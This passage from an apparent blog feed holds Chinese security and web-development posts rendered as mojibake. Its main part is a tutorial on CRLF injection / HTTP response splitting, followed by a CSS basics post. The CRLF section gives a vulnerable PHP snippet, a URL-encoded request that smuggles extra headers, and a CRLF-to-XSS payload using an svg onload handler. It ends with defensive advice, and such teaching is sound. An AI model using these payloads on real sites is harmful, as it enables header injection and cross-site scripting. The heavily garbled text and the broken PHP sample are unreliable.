<h1 id="0x05-æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#0x05-æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="0x05 æ–‡ä»¶åŒ…å«æ¼æ´"></a>0x05 æ–‡ä»¶åŒ…å«æ¼æ´</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="http://byd.dropsec.xyz/2016/07/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">æ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“</a></p>
]]></content>
      
        
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> XSS </tag>
            
            <tag> PHP </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
            <tag> DVWA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CRLFæ¼æ´]]></title>
      <url>/2016/08/31/CRLF-injection%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h1><p>åœ¨æ–‡æœ¬å¤„ç†ä¸­, CR, LF, CR/LFæ˜¯ä¸åŒæ“ä½œç³»ç»Ÿä¸Šä½¿ç”¨çš„æ¢è¡Œç¬¦.Doså’Œwindowsé‡‡ç”¨å›è½¦+æ¢è¡ŒCR/LFè¡¨ç¤ºä¸‹ä¸€è¡Œ,è€ŒUNIX/Linuxé‡‡ç”¨æ¢è¡Œç¬¦LFè¡¨ç¤ºä¸‹ä¸€è¡Œï¼Œè‹¹æœæœº(MAC OSç³»ç»Ÿ)åˆ™é‡‡ç”¨å›è½¦ç¬¦CRè¡¨ç¤ºä¸‹ä¸€è¡Œ.CRç”¨ç¬¦å·â€™râ€™è¡¨ç¤º, åè¿›åˆ¶ASCIIä»£ç æ˜¯13, åå…­è¿›åˆ¶ä»£ç ä¸º0x0D; LFä½¿ç”¨â€™nâ€™ç¬¦å·è¡¨ç¤º, ASCIIä»£ç æ˜¯10, åå…­åˆ¶ä¸º0x0A.æ‰€ä»¥Windowså¹³å°ä¸Šæ¢è¡Œåœ¨æ–‡æœ¬æ–‡ä»¶ä¸­æ˜¯ä½¿ç”¨ 0d 0a ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤º, è€ŒUNIXå’Œè‹¹æœå¹³å°ä¸Šæ¢è¡Œåˆ™æ˜¯ä½¿ç”¨0aæˆ–0dä¸€ä¸ªå­—èŠ‚è¡¨ç¤º.</p>
<a id="more"></a>
<h1 id="0x01-åŸç†"><a href="#0x01-åŸç†" class="headerlink" title="0x01 åŸç†"></a>0x01 åŸç†</h1><p><font color="#000ff">æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒHTTPåè®®æ˜¯ä¾é ä¸¤ä¸ªCRLFï¼Œå³\r\næ¥åˆ†å‰²HTTPå¤´éƒ¨åŠå“åº”ä½“ã€‚åŸºäºè¿™ä¸ªè®¤çŸ¥ï¼Œå¯ä»¥æ¨å‡ºï¼ŒHRSé—®é¢˜æ˜¯ç”±äºæœåŠ¡ç«¯ç¨‹åºæ²¡æœ‰è¿‡æ»¤æ‰å¤´éƒ¨ä¸­çš„ç‰¹æ®Šå­—ç¬¦%0D%0Aï¼Œç›´æ¥è¾“å‡ºåˆ°äº†è¿”å›çš„æ•°æ®ä¸­ï¼Œå¯¼è‡´é”™è¯¯çš„è§£æã€‚è€Œåœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæœ€å¸¸è§çš„è«è¿‡äºæœ‰ä»¥ä¸‹çš„ä¸¤ç§åŠŸèƒ½ï¼ˆ1ï¼‰URLè·³è½¬ï¼ˆ2ï¼‰Cookieçš„è®¾ç½®ä¸­å‡ºç°ã€‚<font></font></font></p>
<p>ä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶httpå¤´ï¼Œé€šè¿‡æ³¨å…¥ä¸€äº›CRLFè¿™æ ·å°±å¯ä»¥æ§åˆ¶headerå’Œbodyçš„åˆ†å‰²çº¿ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘bodyæˆ–æ˜¯headerä¸­æ³¨å…¥äº›ä¸œè¥¿äº†ã€‚æ‰€ä»¥CRLF Injectionåˆå«HTTP Response Splittingï¼Œç®€ç§°HRSã€‚</p>
<h1 id="0x02-å±å®³"><a href="#0x02-å±å®³" class="headerlink" title="0x02 å±å®³"></a>0x02 å±å®³</h1><p>å¦‚æœç›®æ ‡ç½‘é¡µå­˜åœ¨å“åº”å¤´éƒ¨CRLFæ³¨å…¥ï¼Œåœ¨HTTPå“åº”å¤´æ³¨å…¥å›è½¦æ¢è¡Œç¬¦ï¼Œå°±å¯ä»¥æ³¨å…¥å¤´éƒ¨ï¼š<br>X-XSS-Protection: 0</p>
<pre><code>HTTP headerçš„å®šä¹‰å°±æ˜¯åŸºäºè¿™æ ·çš„&quot;Key: Value&quot;çš„ç»“æ„ï¼Œç”¨CRLFå‘½ä»¤è¡¨ç¤ºä¸€è¡Œçš„ç»“å°¾ã€‚
&quot;Location:&quot;å¤´ç”¨æ¥è¡¨ç¤ºé‡å®šå‘çš„URLåœ°å€ï¼Œ
&quot;Set-Cookie:&quot;å¤´ç”¨æ¥è®¾ç½®cookiesã€‚
å¦‚æœç”¨æˆ·çš„è¾“å…¥ç»è¿‡éªŒè¯ï¼Œå…¶ä¸­å­˜åœ¨CRLFçš„å­—ç¬¦å°±å¯ä»¥è¢«ç”¨æ¥è¾¾åˆ°æ¬ºéª—çš„ç›®çš„ã€‚
</code></pre><h1 id="0x03-å®ä¾‹"><a href="#0x03-å®ä¾‹" class="headerlink" title="0x03 å®ä¾‹"></a>0x03 å®ä¾‹</h1><p>æµ‹è¯•ä»£ç ï¼š<br>index.php</p>
<pre><code>&lt;?php 
/*
*@åšå®¢ï¼šhttp://byd.dropsec.xyz/
*@Authorï¼šw2n1ck
*/
echo &apos;&lt;pre&gt;&apos;;
print_r(file(&quot;http://www.site1.com/api?test=$test&quot;/images/test.png)); 
echo &apos;&lt;/pre&gt;&apos;;
?&gt; 
</code></pre><p>å¦‚æœæ”»å‡»è€…è¿™æ ·å‘é€ï¼š</p>
<blockquote>
<p>index.php?test=test%20HTTP /1.0%0D%0AHost%3A%20www.site2.com%0D%0AUser-Agent%3A%20joy_nick/0.0%0D%0AReferer%3A%20http%3A%2F%2Fwww.test.org%2F%0D%0ACookie%3A%20user%3Djoy_nick%0D%0A%0D%0AHTTP/1.0%0D%0AHost%3A%20http%3A%2F%2Fwww.SITE1.com%0D%0AUser-Agent%3A%20PHP/4.1.2</p>
</blockquote>
<p>(å¿…é¡»åœ¨ä¸€è¡Œä¸Š) </p>
<p>è¿™ä¸ª HTTP è¯·æ±‚å°†è¢«å‘é€ç»™ www.site1.com:  </p>
<pre><code>GET /api?test=test HTTP/1.0 
Host: www.site2.com
User-Agent: joy_nick/0.0 
Referer: http://www.test.org/ 
Cookie: user=joy_nick

HTTP/1.0 
Host: www.site1.st 
User-Agent: PHP/4.1.2
</code></pre><p>ä½ å¯ä»¥çœ‹åˆ°ï¼ŒçœŸå®çš„PHPå¤´ä¿¡æ¯è¢«æ­£ç¡®å‘é€ï¼Œä½†è¢«æœåŠ¡å™¨å¿½ç•¥äº†ï¼Œå› ä¸ºåœ¨å®ƒä»¬æŒ‡å‘çš„æŠ¥å¤´ç»“æŸä¹‹å‰æˆ‘ä»¬å‘é€ä¸¤ä¸ªCRLFã€‚ </p>
<p>åˆ©ç”¨æ­¤ç¼ºé™·ï¼Œæ”»å‡»è€…èƒ½å¤Ÿä»»æ„æ·»åŠ ç”¨æˆ·ä»£ç†ï¼ˆuser-agentï¼‰ï¼Œreferers å’Œ cookiesã€‚å¦‚æœç«™ç‚¹1å’Œç«™ç‚¹2æ˜¯åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„è™šæ‹Ÿä¸»æœºï¼Œå³ä½¿index.phpæœ‰é™åˆ¶ï¼Œæ”»å‡»è€…ä¹Ÿèƒ½ç»•è¿‡å…¶é™åˆ¶éæ³•è®¿é—®ç«™ç‚¹2ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªxssçš„èƒ½å¤Ÿè½»æ¾ç»•è¿‡filterçš„XSSï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ï¼š</p>
<blockquote>
<p><a href="http://www.xxx.com%0d%0a%0d%0a%3Csvg%2fonload%3dprompt%281%29%3E" target="_blank" rel="external">http://www.xxx.com%0d%0a%0d%0a%3Csvg%2fonload%3dprompt%281%29%3E</a></p>
</blockquote>
<pre><code>HTTP/1.1 200 ok
Date: XXX
Content-Type: text/html
Content-Length: 154
Connection: close

&lt;svg/onload=prompt(1)&gt;
</code></pre><p>ä»è€Œå½¢æˆXSSæ¼æ´</p>
<h1 id="0x04-é˜²å¾¡"><a href="#0x04-é˜²å¾¡" class="headerlink" title="0x04 é˜²å¾¡"></a>0x04 é˜²å¾¡</h1><ol>
<li>æ‚¨éœ€è¦é™åˆ¶ç”¨æˆ·è¾“å…¥CRï¼ˆ0x13ï¼‰å’ŒLFï¼ˆä¸º0x10ï¼‰æˆ–æ­£ç¡®ç¼–ç çš„è¾“å‡ºï¼Œä»¥é˜²æ­¢è‡ªå®šä¹‰HTTPæ ‡å¤´æ³¨å°„ã€‚</li>
<li>é€šè¿‡åœ¨PHPè„šæœ¬ä¸­åµŒå…¥å¦‚ä¸‹æŒ‡ä»¤ï¼Œç¡®ä¿æ‰€æœ‰è¿™ç§ç±»å‹çš„URLå˜é‡åœ¨ä½¿ç”¨æ—¶å·²è¢«æ¸…ç©ºï¼š  </li>
</ol>
<blockquote>
<p>$var = preg_replace(â€™///s+/â€™, â€™, $var); </p>
</blockquote>
<ol>
<li>å¦‚æœä½ çš„è„šæœ¬ä¸éœ€è¦è®¿é—®URLsï¼Œå»ºè®®åœ¨php.iniä¸­å…³é—­allow_url_fopen </li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> CRLF </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å‰ç«¯å¼€å‘åŸºç¡€çŸ¥è¯†]]></title>
      <url>/2016/08/29/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<h2 id="CSSç›’å­æ¨¡å‹"><a href="#CSSç›’å­æ¨¡å‹" class="headerlink" title="CSSç›’å­æ¨¡å‹"></a>CSSç›’å­æ¨¡å‹</h2><p>ç½‘é¡µè®¾è®¡ä¸­å¸¸å¬çš„å±æ€§åï¼šå†…å®¹(content)ã€å¡«å……(padding)ã€è¾¹æ¡†(border)ã€è¾¹ç•Œ(margin)ï¼Œ CSSç›’å­æ¨¡å¼éƒ½å…·å¤‡è¿™äº›å±æ€§ã€‚</p>
<p>å…ƒç´ å®é™…å ç”¨å°ºå¯¸ = width(height) + padding + border + margin</p>
<a id="more"></a>
<h2 id="é€‰æ‹©å™¨"><a href="#é€‰æ‹©å™¨" class="headerlink" title="é€‰æ‹©å™¨"></a>é€‰æ‹©å™¨</h2><h3 id="CSS1-å®šä¹‰çš„é€‰æ‹©å™¨"><a href="#CSS1-å®šä¹‰çš„é€‰æ‹©å™¨" class="headerlink" title="CSS1 å®šä¹‰çš„é€‰æ‹©å™¨"></a>CSS1 å®šä¹‰çš„é€‰æ‹©å™¨</h3><ol>
<li>å…ƒç´ é€‰æ‹©å™¨ï¼šE</li>
<li>IDé€‰æ‹©å™¨ï¼š#id</li>
<li>ç±»é€‰æ‹©å™¨ï¼šE.class</li>
<li>åŒ…å«é€‰æ‹©å™¨ï¼šE F</li>
<li>ä¼ªç±»é€‰æ‹©å™¨ï¼šE:linkã€E:visitedã€E:activeã€E:hoverã€E:focus</li>
<li>ä¼ªå…ƒç´ ï¼šE:first-linkã€E:first-letter</li>
</ol>
<h3 id="CSS2-1-å¢åŠ çš„é€‰æ‹©å™¨"><a href="#CSS2-1-å¢åŠ çš„é€‰æ‹©å™¨" class="headerlink" title="CSS2.1 å¢åŠ çš„é€‰æ‹©å™¨"></a>CSS2.1 å¢åŠ çš„é€‰æ‹©å™¨</h3><ol>
<li>é€šé…é€‰æ‹©å™¨ï¼š* (æ˜Ÿå·)</li>
<li>ä¼ªç±»é€‰æ‹©å™¨ï¼šE:lang(fr)</li>
<li>å­åŒ…å«é€‰æ‹©å™¨ï¼šE &gt; F</li>
<li>ç›¸é‚»å…„å¼Ÿé€‰æ‹©å™¨ï¼šE + F</li>
<li>ä¼ªå…ƒç´ ï¼šE:beforeã€E:after</li>
<li>å±æ€§é€‰æ‹©å™¨ï¼šE[foo]ã€E[foo=â€barâ€]ã€E[foo~=â€barâ€]ã€E[foo|=â€barâ€]</li>
</ol>
<h3 id="ä¼˜å…ˆçº§"><a href="#ä¼˜å…ˆçº§" class="headerlink" title="ä¼˜å…ˆçº§"></a>ä¼˜å…ˆçº§</h3><p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%89%8D%E7%AB%AF1.png" alt=""></p>
<p>â€»åŒçº§åæ¥å±…ä¸Š</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>HTMLä»£ç ï¼š</p>
<pre><code>&lt;ul class=&quot;list&quot;&gt;
    &lt;li&gt;one&lt;/li&gt;
    &lt;li&gt;two&lt;/li&gt;
    &lt;li&gt;three&lt;/li&gt;
&lt;/ul&gt;
</code></pre><p>CSSä»£ç ï¼š</p>
<pre><code>ul li{color:#000;}
1 + 1 =2
.list li{color:#f00;}
10 + 1 =11
</code></pre><p><code>.list li</code> çš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¼šæ˜¾ç¤º .list li è®¾ç½®çš„æ ·å¼</p>
<p>å…¶å®è¯´ç™½äº†ï¼Œå°±æ˜¯åé¢çš„ä¼šæŠŠå‰é¢çš„è¦†ç›–æ‰ï¼Œå†…æ•›çš„ä¼šæŠŠlinkçš„è¦†ç›–æ‰ï¼Œç„¶åå†æ•´åˆã€‚</p>
<h2 id="å¸ƒå±€"><a href="#å¸ƒå±€" class="headerlink" title="å¸ƒå±€"></a>å¸ƒå±€</h2><h3 id="æµ®åŠ¨-float"><a href="#æµ®åŠ¨-float" class="headerlink" title="æµ®åŠ¨ (float)"></a>æµ®åŠ¨ (float)</h3><ol>
<li>noneï¼šä¸æµ®åŠ¨ï¼ˆé»˜è®¤å€¼ï¼‰</li>
<li>leftï¼šå·¦æµ®åŠ¨</li>
<li>rightï¼šå³æµ®åŠ¨</li>
</ol>
<p>è§£é‡Šï¼š</p>
<pre><code>æµ®åŠ¨ä»€ä¹ˆæ„æ€å‘¢ï¼Œæ¯”å¦‚ï¼Œé»˜è®¤çš„ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œdivæ˜¯å æ»¡ä¸€è¡Œçš„ï¼Œç°åœ¨æˆ‘ä»¬æƒ³æŠŠä¸¤ä¸ªdivæ˜¾ç¤ºåœ¨ä¸€è¡Œä¸Šï¼Œé‚£æ€ä¹ˆåŠå‘¢
&lt;div style=&quot;width:100px;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt;
è¿™æ ·æˆ‘ä»¬å°±è®¾ç½®äº†ä¸¤ä¸ªdivï¼Œä¸€ä¸ªå®½åº¦100px,ä¸€ä¸ªå®½150px,å¯é¢„è§ˆä¸€ä¸‹ï¼Œæˆ‘ä»¬çš„divä»åœ¨ä¸¤è¡Œä¸Šï¼Œé‚£ä¹ˆæ€ä¹ˆæŠŠå®ƒæ”¹åˆ°ä¸€è¡Œä¸Šå‘¢ï¼Œè¿™å„¿å°±éœ€è¦floatï¼Œè®¾ç½®ç¬¬ä¸€ä¸ªdivçš„floatä¸ºleft
&lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt;
å†é¢„è§ˆï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä»¬åˆ°ä¸€è¡Œä¸Šäº†ã€‚
clearæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œclearæ˜¯æ¸…é™¤çš„æ„æ€ï¼Œå®ƒæœ‰ä¸‰ä¸ªå€¼ï¼Œleft,right,both
å¾ˆå¥½ç†è§£ï¼Œå¦‚æœè®¾ç½®äº†clear:leftï¼Œå®ƒå°±ä¸æ€•å®ƒçš„å·¦è¾¹æœ‰floatï¼ŒåŒç†clear:right,clear:bothï¼Œæ˜¯å·¦å³éƒ½ä¸è®©æœ‰float
ä¸¾ä¸ªä¾‹å­ï¼Œè¿˜æ˜¯ä¸Šé¢çš„
æˆ‘ä»¬è®¾ç½®ç¬¬äºŒä¸ªdivçš„clear:left,ä¹Ÿå°±æ˜¯ä¸è®©å®ƒå·¦è¾¹æœ‰float
&lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px;clear:left;&quot;&gt;2222&lt;/div&gt;
æˆ‘ä»¬é¢„è§ˆä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼Œå°½ç®¡ç¬¬ä¸€ä¸ªdivå·²ç»float:leftäº†ï¼Œè¿™ä¸¤ä¸ªdivä»ç„¶åœ¨ä¸¤è¡Œä¸Šï¼Œå°±æ˜¯ç”±äºç¬¬äºŒä¸ªdivä¸è®©å®ƒå·¦è¾¹æœ‰float
å› ä¸ºcssçš„å®šä¹‰æ˜¯åé¢çš„å¯ä»¥è¦†ç›–å‰é¢çš„ï¼Œæ˜ç™½äº†å§
</code></pre><h3 id="æ¸…æµ®åŠ¨-clear-both"><a href="#æ¸…æµ®åŠ¨-clear-both" class="headerlink" title="æ¸…æµ®åŠ¨-clear-both"></a>æ¸…æµ®åŠ¨-clear-both</h3><p>HTMLä»£ç ï¼š</p>
<pre><code>&lt;div class=&quot;layout&quot;&gt;
    &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;
    &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;
    &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>CSSä»£ç ï¼š</p>
<pre><code>.layout{}
.left{float:left}
.right{float:right}
.clear{clear:both}
</code></pre><h3 id="æ¸…æµ®åŠ¨-overflow-hidden"><a href="#æ¸…æµ®åŠ¨-overflow-hidden" class="headerlink" title="æ¸…æµ®åŠ¨-overflow:hidden"></a>æ¸…æµ®åŠ¨-overflow:hidden</h3><p>HTMLä»£ç ï¼š</p>
<pre><code>&lt;div class=&quot;layout&quot;&gt;
    &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;
    &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>CSSä»£ç ï¼š</p>
<pre><code>.layout{overflow:hidden;zoom:1;}
.left{float:left}
.right{float:right}
</code></pre><h3 id="å®šä½-position"><a href="#å®šä½-position" class="headerlink" title="å®šä½ (position)"></a>å®šä½ (position)</h3><ol>
<li>static-æ²¡æœ‰å®šä½ï¼ˆé»˜è®¤å€¼ï¼‰</li>
<li>relative-ç›¸å¯¹å®šä½</li>
<li>absolute-ç»å¯¹å®šä½</li>
<li>fixed-å›ºå®šå®šä½</li>
</ol>
<h3 id="å±‚çº§"><a href="#å±‚çº§" class="headerlink" title="å±‚çº§"></a>å±‚çº§</h3><ol>
<li>å±‚çº§ (z-index) - åæ¥å±…ä¸Š</li>
<li>å±‚çº§ (z-index) - å®šä½å…ƒç´ é«˜äºéå®šä½å…ƒç´ </li>
<li>å±‚çº§ (z-index) - åŒä¸ºå®šä½å…ƒç´ åˆ™æ¯”è¾ƒ z-index</li>
</ol>
<h3 id="éšè—ä¸æ˜¾ç¤º"><a href="#éšè—ä¸æ˜¾ç¤º" class="headerlink" title="éšè—ä¸æ˜¾ç¤º"></a>éšè—ä¸æ˜¾ç¤º</h3><ol>
<li>éšè—å…ƒç´ ï¼šdisplay:none;visibility:hidden;</li>
<li>æ˜¾ç¤ºå…ƒç´ ï¼šdisplay:block;visibility:visible;</li>
</ol>
<p>â€» â€œdisplayâ€ åœ¨ å—çº§å…ƒç´ &amp;è¡Œå†…å…ƒç´  ä¸­å†è¯¦ç»†ä»‹ç»</p>
<h2 id="CSS-Reset"><a href="#CSS-Reset" class="headerlink" title="CSS Reset"></a>CSS Reset</h2><pre><code>html,body,div,ul,ol,li,dl,dt,dd,h1,h2,h3,h4,h5,h6,p,table,th,td,fieldset,
form,input,button,textarea,hr,blockquote,pre{margin:0;padding:0;}
h1,h2,h3,h4,h5,h6{font-size:100%; font-weight:bold;line-height:1em;}
ul,ol,dl{list-style-type:none;}
fieldset,img{border:none;}
table{border-collapse:collapse;table-layout:fixed;empty-cells:show;}
address,caption,cite,code,dfn,th{font-style:normal;font-weight:normal;}
ins{text-decoration:underline;}
del{text-decoration:line-through;}
q:before,q:after{content:&quot;&quot;;}
</code></pre><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<p>ä¸è¦ä½¿ç”¨ *{margin:0;padding:0;}</p>
<p>æœ€2Bçš„ Resetï¼š div{float:left;}</p>
<h2 id="CSS-ä¼˜åŒ–"><a href="#CSS-ä¼˜åŒ–" class="headerlink" title="CSS ä¼˜åŒ–"></a>CSS ä¼˜åŒ–</h2><h3 id="å±æ€§ç®€å†™-å¤–è¾¹è·"><a href="#å±æ€§ç®€å†™-å¤–è¾¹è·" class="headerlink" title="å±æ€§ç®€å†™-å¤–è¾¹è·"></a>å±æ€§ç®€å†™-å¤–è¾¹è·</h3><pre><code>margin:10px 15px 20px 25px;
        ä¸‹     ä¸Š å³    å·¦ é¡ºæ—¶é’ˆæ–¹å‘

margin:10px;
        ä¸Šä¸‹å·¦å³ç»Ÿä¸€è®¾ç½®

margin:10px 15px;
        ä¸Šä¸‹ å·¦å³
</code></pre><h3 id="å±æ€§ç®€å†™-å†…è¾¹è·"><a href="#å±æ€§ç®€å†™-å†…è¾¹è·" class="headerlink" title="å±æ€§ç®€å†™-å†…è¾¹è·"></a>å±æ€§ç®€å†™-å†…è¾¹è·</h3><pre><code>padding:10px 15px 20px 25px;
        ä¸‹     ä¸Š  å³     å·¦ ç®€å†™æ–¹å¼ä¸ margin ç›¸åŒ
</code></pre><h3 id="å±æ€§ç®€å†™-èƒŒæ™¯"><a href="#å±æ€§ç®€å†™-èƒŒæ™¯" class="headerlink" title="å±æ€§ç®€å†™-èƒŒæ™¯"></a>å±æ€§ç®€å†™-èƒŒæ™¯</h3><pre><code>background:#ff0000 url(bg.jpg) no-repeat fixed   top center;
            é¢œè‰²     å›¾åƒ       å¹³é“ºæ–¹å¼   æ»šåŠ¨æ–¹å¼ å›¾åƒå¼€å§‹ä½ç½®
</code></pre><p>å¯ä»¥çœç•¥éƒ¨åˆ†å€¼</p>
<p>background:#f00;</p>
<p>background:url(bg.jpg) no-repeat;</p>
<h3 id="å±æ€§ç®€å†™-è¾¹æ¡†"><a href="#å±æ€§ç®€å†™-è¾¹æ¡†" class="headerlink" title="å±æ€§ç®€å†™-è¾¹æ¡†"></a>å±æ€§ç®€å†™-è¾¹æ¡†</h3><pre><code>border:1px solid #ff0000;
       å®½åº¦ æ ·å¼  é¢œè‰²
</code></pre><p>å¯ä»¥çœç•¥éƒ¨åˆ†å€¼</p>
<p>border:solid #f00;</p>
<p>border:1px solid;</p>
<h3 id="å±æ€§ç®€å†™-å­—ä½“"><a href="#å±æ€§ç®€å†™-å­—ä½“" class="headerlink" title="å±æ€§ç®€å†™-å­—ä½“"></a>å±æ€§ç®€å†™-å­—ä½“</h3><pre><code>font:italic bold 15px/20px &quot;å¾®è½¯é›…é»‘&quot;
       æ–œä½“  ç²—ä½“   å­—å·/è¡Œé«˜ å­—ä½“åç§°
</code></pre><p>å­—å·ä¸å­—ä½“åç§°æ˜¯å¿…é¡»çš„ï¼Œå…¶ä»–å€¼å¯çœç•¥</p>
<p>font:15px â€œå¾®è½¯é›…é»‘â€;</p>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<p>ç®€å†™ä¸­çœç•¥ä¸å†™çš„å±æ€§ï¼Œå°†ä½¿ç”¨é»˜è®¤å€¼ï¼Œè€Œä¸æ˜¯ç»§æ‰¿ã€‚</p>
<h3 id="å±æ€§ç»§æ‰¿"><a href="#å±æ€§ç»§æ‰¿" class="headerlink" title="å±æ€§ç»§æ‰¿"></a>å±æ€§ç»§æ‰¿</h3><p>æ–‡æœ¬ç›¸å…³çš„æ ·å¼ä¼šç»§æ‰¿</p>
<p>åˆ—è¡¨ç›¸å…³çš„æ ·å¼ä¼šç»§æ‰¿</p>
<p>é¢œè‰²å±æ€§ä¼šç»§æ‰¿</p>
<h3 id="é€‰æ‹©å™¨ä¼˜åŒ–"><a href="#é€‰æ‹©å™¨ä¼˜åŒ–" class="headerlink" title="é€‰æ‹©å™¨ä¼˜åŒ–"></a>é€‰æ‹©å™¨ä¼˜åŒ–</h3><p>ä»å³åˆ°å·¦çš„è§£æé¡ºåº</p>
<pre><code>body ul li a {color:#f00;}
4     3   2  1
</code></pre><p>é€‰æ‹©å™¨çš„æ•ˆç‡</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%89%8D%E7%AB%AF2.png" alt=""></p>
<p>â€»åœ¨ä¸€äº› JavaScript åº“ä¸­çš„é€‰æ‹©å™¨ï¼Œä¹Ÿé€‚ç”¨äºè¯¥æ•ˆç‡ã€‚ï¼ˆä¾‹å¦‚ï¼šjQueryï¼‰</p>
<p>å±æ€§ç»§æ‰¿ï¼Œå‡å°‘é€‰æ‹©å™¨</p>
<pre><code>.box { padding:10px; }
.box p { color:#333; }
</code></pre><p>ç®€åŒ–ä¸ºï¼š</p>
<pre><code>.box { padding:10px ; color:#333; }
</code></pre><h3 id="ä¹¦å†™é¡ºåº"><a href="#ä¹¦å†™é¡ºåº" class="headerlink" title="ä¹¦å†™é¡ºåº"></a>ä¹¦å†™é¡ºåº</h3><pre><code>æ˜¾ç¤ºå±æ€§            è‡ªèº«å±æ€§            æ–‡æœ¬å±æ€§
display         top                color
visibility        left            font
overflow        width            line-height
position        height            text-align
float            margin            text-decoration
clear            padding            text-indent
                border            text-transform
                outline            vertical-align
                background        white-space
                                content
</code></pre><h2 id="æ ‡ç­¾-amp-è¯­ä¹‰"><a href="#æ ‡ç­¾-amp-è¯­ä¹‰" class="headerlink" title="æ ‡ç­¾&amp;è¯­ä¹‰"></a>æ ‡ç­¾&amp;è¯­ä¹‰</h2><p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%89%8D%E7%AB%AF3.png" alt=""></p>
<h2 id="å—å…ƒç´ -amp-è¡Œå†…å…ƒç´ "><a href="#å—å…ƒç´ -amp-è¡Œå†…å…ƒç´ " class="headerlink" title="å—å…ƒç´ &amp;è¡Œå†…å…ƒç´ "></a>å—å…ƒç´ &amp;è¡Œå†…å…ƒç´ </h2><p><strong>å—å…ƒç´  (block)</strong></p>
<p>div p h1~h6 ul ol li dl dt dd table form â€¦</p>
<p><strong>è¡Œå†…å…ƒç´  (inline)</strong></p>
<p>span a img em strong select input textarea â€¦</p>
<p>è¡Œå†…å…ƒç´ æ— æ³•è®¾ç½®ä¸€äº›CSSå±æ€§ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code>width, height, margin-top, margin-bottom,
padding-top padding-bottom, text-index â€¦
</code></pre><p>â€»å¯ä»¥ä½¿ç”¨ display æ¥æ”¹å˜</p>
<p><strong>display å¸¸ç”¨å±æ€§</strong></p>
<p>å®Œæ•´å±æ€§æŸ¥é˜…ï¼š<a href="http://www.w3school.com.cn/css/pr_class_display.asp" target="_blank" rel="external">http://www.w3school.com.cn/css/pr_class_display.asp</a></p>
<ol>
<li>inline è®¾ç½®ä¸ºè¡Œå†…å…ƒç´ </li>
<li>block è®¾ç½®ä¸ºå—å…ƒç´ </li>
<li>inline-block è®¾ç½®ä¸ºè¡Œå†…å—å…ƒç´ *</li>
<li>none å…ƒç´ ä¸ä¼šè¢«æ˜¾ç¤º</li>
</ol>
<p><strong>åµŒå¥—è§„åˆ™</strong></p>
<p>å—å…ƒç´ å†…èƒ½åŒ…å«æ‰€æœ‰è¡Œå†…å…ƒç´ </p>
<p>è¡Œå†…å…ƒç´ ä¸èƒ½åŒ…å«å—å…ƒç´ </p>
<p><strong>ä»¥ä¸‹å—å…ƒç´ ä¸­ä¸èƒ½åŒ…å«å—å…ƒç´ </strong></p>
<p>h1~h6, p, dt, address</p>
<h2 id="HTML5-ç®€å•åº”ç”¨"><a href="#HTML5-ç®€å•åº”ç”¨" class="headerlink" title="HTML5 ç®€å•åº”ç”¨"></a>HTML5 ç®€å•åº”ç”¨</h2><pre><code>DocType
&lt;!DOCTYPE HTML&gt;
å­—ç¬¦é›†
&lt;meta charset=&quot;utf-8&quot;&gt;
å¤–é“¾ css æ–‡ä»¶
&lt;link rel=&quot;stylesheet&quot; href=â€œfilename.css&quot;&gt;
å¤–é“¾ javascript æ–‡ä»¶
&lt;script src=â€œfilename.js&quot;&gt;&lt;/script&gt;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> å‰ç«¯ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
        </tags>
